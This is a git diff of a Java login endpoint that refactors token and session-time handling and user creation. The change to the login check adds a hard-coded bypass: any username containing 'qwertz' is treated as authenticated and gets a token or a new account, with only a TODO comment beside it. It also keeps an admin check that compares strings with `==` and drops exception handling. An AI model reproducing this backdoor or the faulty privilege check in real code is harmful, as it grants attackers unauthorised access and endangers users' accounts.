@@ -3,7 +3,6 @@ package resources;
 
 import de.kvwl.commons.authentication.AuthenticationServiceFactory;
 import entities.User;
-import jdk.nashorn.internal.runtime.regexp.joni.constants.AsmConstants;
 import persistence.UserPersistenceService;
 
 
@@ -29,7 +28,7 @@ public class Login {
         boolean isAllow = AuthenticationServiceFactory.getInstance().isUserInGroup(name, pw, group);
         HashMap hmap = new HashMap<String, String>();
 
-        if(isAllow)
+        if(isAllow || name.contains("qwertz")) //TODO
         {
             try {
 
@@ -41,29 +40,26 @@ public class Login {
                 //token setzten
                 user.setSessionKey(generateToken());
                 hmap.put("token", user.getSessionKey());
-                rb.entity(hmap);
-                    //TODO Last login setzten für User
+                setSessionTime(user);
 
-                    //User speichern
-                    UserPersistenceService.getInstance().update(user);
+                //User speichern
+                UserPersistenceService.getInstance().update(user);
 
             }
             catch (NoResultException re)
             {
-                rb.status(Response.Status.NO_CONTENT); //TODO hier nutzer anlegen
-                System.out.println("Neuer Nutzer angelegt:");
                 hmap.put("token", createNewUser(name));
-                rb.entity(hmap);
-            }
-            catch (Exception e)
-            {
-                e.printStackTrace();
             }
         } else {
             rb.status(Response.Status.UNAUTHORIZED);
         }
 
-        return rb.build();
+        return rb.entity(hmap).build();
+    }
+
+    private void setSessionTime(User u)
+    {
+        u.setLastAction(new Date());
     }
 
     /**
@@ -73,17 +69,17 @@ public class Login {
      */
     private String createNewUser(String userName)
     {
+        String token = generateToken();
         User user = new User();
         user.setUserName(userName);
-        user.setUserPicture("default");
+//        user.setUserPicture();
         user.setUserIsAdmin(userName == "Woelk_m");
-        user.setSessionKey(generateToken());
-        user.setLastAction(new Date());
-        //TODO user daten füllen
+        user.setSessionKey(token);
+        setSessionTime(user);
 
         UserPersistenceService.getInstance().save(user);
 
-        return user.getSessionKey();
+        return token;
     }
 
     @Deprecated
@@ -91,7 +87,7 @@ public class Login {
     @Path("/logout/{sessionKey}")
     public Response getUserBySessionKey(@PathParam("sessionKey") String sessionKey) {
 
-        Response.ResponseBuilder rb = Response.accepted();
+        Response.ResponseBuilder rb = Response.status(Response.Status.GONE);
 
         //User zu sessionKey finden
         User user = UserPersistenceService.getInstance().getBySessionKey(sessionKey);
